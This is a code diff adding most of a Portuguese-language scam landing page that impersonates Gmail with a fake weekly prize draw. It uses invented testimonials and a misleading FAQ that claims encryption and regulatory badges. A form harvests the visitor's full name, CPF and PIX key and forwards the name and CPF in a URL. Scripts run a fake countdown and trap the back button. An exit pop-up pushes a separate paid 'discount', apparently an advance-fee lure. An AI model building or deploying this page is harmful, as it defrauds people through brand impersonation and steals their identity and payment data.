+        <div><div class="t-name">Rafael Torres</div><div style="display:flex;gap:6px;margin-top:2px"><span class="stars">★★★★★</span><span class="t-time">· há 5 h</span></div></div>
+      </div>
+      <p>Recebi a mensagem dos sorteios semanais e fui contemplado. Confirmei meus dados e o Nubank apitou com o PIX!</p>
+    </div>
+    <div class="tcard">
+      <div class="tcard-head">
+        <div class="avatar" style="background:#fce8e6;color:#EA4335">MS</div>
+        <div><div class="t-name">Marcos Silva</div><div style="display:flex;gap:6px;margin-top:2px"><span class="stars">★★★★★</span><span class="t-time">· há 1 dia</span></div></div>
+      </div>
+      <p>Sistema confiável. Validei a chave PIX e o desbloqueio foi automático. Vale demais ser contemplado.</p>
+    </div>
+    <div class="tcard">
+      <div class="tcard-head">
+        <div class="avatar" style="background:#fef7e0;color:#b06000">SA</div>
+        <div><div class="t-name">Simone Albuquerque</div><div style="display:flex;gap:6px;margin-top:2px"><span class="stars">★★★★★</span><span class="t-time">· há 2 dias</span></div></div>
+      </div>
+      <p>Já caí em muito golpe, mas a garantia me deu segurança. Saque liberado direto na chave do meu CPF.</p>
+    </div>
+  </div>
+</section>
+
+<!-- FAQ -->
+<section class="section bg-white">
+  <p class="section-tag">Dúvidas frequentes</p>
+  <h2 class="section-h"><strong>FAQ</strong></h2>
+  <div class="faq">
+    <div class="faq-item">
+      <button class="faq-btn">Como sei que fui realmente sorteado(a)?<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></button>
+      <div class="faq-answer">Seu e-mail foi selecionado entre milhares de contas Gmail ativas no Brasil nesta semana. Ao confirmar seus dados, validamos que a participação corresponde ao e-mail contemplado.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn">É seguro informar meus dados aqui?<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></button>
+      <div class="faq-answer">Sim. A página opera com conexão criptografada de ponta a ponta (256-bit) e seus dados são usados apenas para validar o sorteio e liberar o PIX na sua chave.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn">Quanto tempo o PIX leva para cair?<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></button>
+      <div class="faq-answer">Após a confirmação dos dados e o cadastro da chave PIX, o envio é automatizado e o valor cai em média entre 5 e 10 minutos.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn">Os sorteios são semanais?<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></button>
+      <div class="faq-answer">Sim. Toda semana selecionamos contemplados entre milhares de contas Gmail ativas no Brasil.</div>
+    </div>
+    <div class="faq-item">
+      <button class="faq-btn">Posso confirmar pelo celular?<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"/></svg></button>
+      <div class="faq-answer">Sim. A confirmação funciona em qualquer dispositivo, sem instalar nada.</div>
+    </div>
+  </div>
+</section>
+
+<!-- FOOTER BAND -->
+<div class="footer-band">
+  <div class="timer-row2">
+    <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+    Tempo restante: <span id="timer2">12:00</span>
+  </div>
+  <h2>O saldo já está no <strong>Gmail.</strong></h2>
+  <p>Ele já foi acumulado. Ele já está no seu nome.<br>Agora só falta você liberar o saque.</p>
+  <button onclick="openModal()" class="footer-cta">
+    Liberar meu saque agora
+    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg>
+  </button>
+</div>
+
+<footer>
+  © Gmail Premia Brasil · premiacoes@gmail-oficial.com · Campanha promocional · <a href="#">Termos aplicáveis</a>
+</footer>
+
+<!-- MODAL -->
+<div class="modal-overlay" id="modal" hidden>
+  <div class="sheet">
+    <div class="sheet-handle"></div>
+    <button class="sheet-close" id="modalClose">✕</button>
+    <div class="sheet-inner">
+      <div id="modalForm">
+        <div class="sheet-icon"><img src="/piximage.jpg" alt="PIX" style="width:30px;height:30px;object-fit:contain;border-radius:6px"></div>
+        <h2>Para onde enviamos o PIX?</h2>
+        <p class="sheet-sub">Cadastre a chave exata onde deseja receber os <strong>R$ 17.658,00</strong>.</p>
+        <form id="emailForm" novalidate>
+          <label class="g-label" for="nomeInput">Nome completo</label>
+          <input class="g-input" id="nomeInput" type="text" placeholder="Seu nome completo" autocomplete="name">
+          <div class="g-error" id="nomeError">Digite seu nome completo.</div>
+          <label class="g-label" for="cpfInput">CPF</label>
+          <input class="g-input" id="cpfInput" type="text" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+          <div class="g-error" id="cpfError">Digite um CPF válido.</div>
+          <label class="g-label" for="emailInput">Chave PIX</label>
+          <input class="g-input" id="emailInput" type="text" placeholder="exemplo@email.com" autocomplete="email">
+          <div class="g-error" id="emailError">Digite uma chave PIX válida.</div>
+          <button type="submit" class="btn-blue">Confirmar minha chave<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="9 18 15 12 9 6"/></svg></button>
+        </form>
+        <div class="trust-row">
+          <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>SSL 256-bit</span>
+          <span>LGPD</span>
+          <span><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20 6 9 17 4 12"/></svg>PIX BACEN</span>
+        </div>
+      </div>
+      <div id="modalSuccess" hidden>
+        <div class="ok-icon"><svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3"><polyline points="20 6 9 17 4 12"/></svg></div>
+        <h2>Confirmado!</h2>
+        <p class="sheet-sub">Redirecionando...<br><strong id="confirmedEmail"></strong></p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- EXIT MODAL -->
+<div class="modal-overlay" id="exitModal" hidden>
+  <div class="exit-sheet">
+    <div class="exit-bar"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>Espera! Sua oferta está quase expirando</div>
+    <div class="exit-inner">
+      <div style="font-size:32px;margin-bottom:10px">⚠️</div>
+      <h2>Faltam segundos para garantir com <span>50% OFF</span></h2>
+      <p>Seu desconto ainda está <strong>reservado</strong>. Se sair agora, perde por apenas <span class="green">R$ 47,00</span>.</p>
+      <div class="exit-rows">
+        <div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="16 9 11 14 8 11"/></svg><span><strong>+3.200 pessoas</strong> garantiram esta semana</span></div>
+        <div><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg><span>Oferta disponível por <strong>mais alguns minutos</strong></span></div>
+      </div>
+      <button class="btn-blue" id="exitStay" style="height:48px;border-radius:100px"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>Quero garantir meu acesso</button>
+      <button class="btn-ghost" id="exitLeave">Sair e perder o desconto</button>
+      <p class="exit-foot"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>Checkout seguro · Desconto expira ao sair</p>
+    </div>
+  </div>
+</div>
+
+<script>
+  function startCountdown(s){
+    const els=[document.getElementById('timer'),document.getElementById('timer2')];
+    let r=s;
+    (function u(){
+      const m=String(Math.floor(r/60)).padStart(2,'0'),sec=String(r%60).padStart(2,'0');
+      els.forEach(e=>{if(e)e.textContent=m+':'+sec});
+      if(r>0){r--;setTimeout(u,1000);}
+    })();
+  }
+  let t;try{t=parseInt(sessionStorage.getItem('magic-timer')||'720',10)}catch(e){t=720}
+  if(isNaN(t))t=720;startCountdown(t);
+  setInterval(()=>{try{sessionStorage.setItem('magic-timer',String(Math.max(0,t--)))}catch(e){}},1000);
+
+  document.querySelectorAll('.faq-btn').forEach(btn=>{
+    btn.addEventListener('click',()=>{
+      const item=btn.closest('.faq-item'),open=item.classList.contains('open');
+      document.querySelectorAll('.faq-item.open').forEach(i=>i.classList.remove('open'));
+      if(!open)item.classList.add('open');
+    });
+  });
+
+  const modal=document.getElementById('modal');
+  function openModal(){
+    document.getElementById('modalForm').hidden=false;
+    document.getElementById('modalSuccess').hidden=true;
+    modal.hidden=false;document.body.style.overflow='hidden';
+    setTimeout(()=>document.getElementById('emailInput').focus(),120);
+  }
+  function closeModal(){modal.hidden=true;document.body.style.overflow='';}
+  document.getElementById('modalClose').addEventListener('click',closeModal);
+  modal.addEventListener('click',e=>{if(e.target===modal)closeModal();});
+  document.addEventListener('keydown',e=>{if(e.key==='Escape'&&!modal.hidden)closeModal();});
+
+  document.getElementById('cpfInput').addEventListener('input',function(){
+    let v=this.value.replace(/\D/g,'').slice(0,11);
+    if(v.length>9)v=v.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/,'$1.$2.$3-$4');
+    else if(v.length>6)v=v.replace(/(\d{3})(\d{3})(\d{0,3})/,'$1.$2.$3');
+    else if(v.length>3)v=v.replace(/(\d{3})(\d{0,3})/,'$1.$2');
+    this.value=v;
+  });
+
+  document.getElementById('emailForm').addEventListener('submit',e=>{
+    e.preventDefault();
+    const nome=document.getElementById('nomeInput'),cpf=document.getElementById('cpfInput'),pix=document.getElementById('emailInput');
+    let ok=true;
+    if(nome.value.trim().length<3){document.getElementById('nomeError').style.display='block';nome.focus();ok=false;}else document.getElementById('nomeError').style.display='none';
+    if(cpf.value.replace(/\D/g,'').length!==11){document.getElementById('cpfError').style.display='block';if(ok){cpf.focus();ok=false;}}else document.getElementById('cpfError').style.display='none';
+    if(pix.value.trim().length<1){document.getElementById('emailError').style.display='block';if(ok){pix.focus();ok=false;}}else document.getElementById('emailError').style.display='none';
+    if(!ok)return;
+    try{sessionStorage.setItem('lead_nome',nome.value.trim());sessionStorage.setItem('lead_cpf',cpf.value.trim());sessionStorage.setItem('ebook_email',pix.value.trim());}catch(err){}
+    allowLeave=true;
+    window.location.href='/loading?nome='+encodeURIComponent(nome.value.trim())+'&cpf='+encodeURIComponent(cpf.value.replace(/\D/g,''));
+  });
+
+  const exitModal=document.getElementById('exitModal');
+  let allowLeave=false,trapArmed=false;
+  function armTrap(){if(trapArmed)return;trapArmed=true;try{history.pushState({trap:true},'',location.href);}catch(e){}}
+  ['pointerdown','touchstart','keydown'].forEach(ev=>window.addEventListener(ev,armTrap,{passive:true}));
+  window.addEventListener('popstate',()=>{
+    if(allowLeave||!trapArmed)return;
+    try{history.pushState({trap:true},'',location.href);}catch(e){}
+    if(modal.hidden&&exitModal.hidden){exitModal.hidden=false;document.body.style.overflow='hidden';}
+  });
+  document.getElementById('exitStay').addEventListener('click',()=>{exitModal.hidden=true;document.body.style.overflow='';openModal();});
+  document.getElementById('exitLeave').addEventListener('click',()=>{allowLeave=true;exitModal.hidden=true;document.body.style.overflow='';try{history.back();}catch(e){}});
+  exitModal.addEventListener('click',e=>{if(e.target===exitModal){exitModal.hidden=true;document.body.style.overflow='';}});
+  window.addEventListener('beforeunload',e=>{if(allowLeave||!trapArmed)return;e.preventDefault();e.returnValue='';});
+</script>
+</body>
+</html>
